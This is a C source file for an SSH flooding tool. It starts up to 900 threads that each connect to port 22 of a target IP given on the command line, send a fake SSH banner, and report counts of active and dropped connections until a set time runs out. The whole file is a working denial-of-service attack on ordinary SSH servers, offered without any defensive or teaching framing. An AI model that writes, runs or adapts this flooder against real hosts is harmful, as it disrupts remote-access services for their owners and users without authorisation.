#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pthread.h>
#include <time.h>

#define NUM_CONNECTIONS 900
#define SSH_PORT 22

int successful_connections = 0;
int active_connections = 0;
int dropped_connections = 0;
pthread_mutex_t lock;

void *handle_connection(void *target_ip) {
    int sock;
    struct sockaddr_in server;
    char buffer[1024] = "SSH-2.0-SSH_Flood_Test\r\n";

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr((char *)target_ip);
    server.sin_port = htons(SSH_PORT);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
        pthread_mutex_lock(&lock);
        successful_connections++;
        active_connections++;
        pthread_mutex_unlock(&lock);

        send(sock, buffer, strlen(buffer), 0);
        sleep(1); // DONT CHANGE

        pthread_mutex_lock(&lock);
        active_connections--;
        pthread_mutex_unlock(&lock);
    } else {
        pthread_mutex_lock(&lock);
        dropped_connections++;
        pthread_mutex_unlock(&lock);
    }

}

void *monitor_connections(void *arg) {
    time_t endwait = *(time_t *)arg;
    while(time(NULL) <= endwait) {
        pthread_mutex_lock(&lock);
        printf("Active Connections: %d, Successful: %d, Dropped: %d\n", 
               active_connections, successful_connections, dropped_connections);
        pthread_mutex_unlock(&lock);
        sleep(1); // slamthathoe
    }
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <IP Address> <Duration in Seconds>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int duration = atoi(argv[2]);
    time_t endwait = time(NULL) + duration;
    pthread_t threads[NUM_CONNECTIONS], monitor_thread;
    
    pthread_mutex_init(&lock, NULL);

    pthread_create(&monitor_thread, NULL, monitor_connections, &endwait);

    for (long i = 0; i < NUM_CONNECTIONS; i++) {
        pthread_create(&threads[i], NULL, handle_connection, (void *)target_ip);
        pthread_detach(threads[i]);
        if (time(NULL) > endwait) break;
        usleep(10000);
    }

    pthread_join(monitor_thread, NULL);
    printf("SSH Flood Over.\n");

    pthread_mutex_destroy(&lock);
    return 0;
}
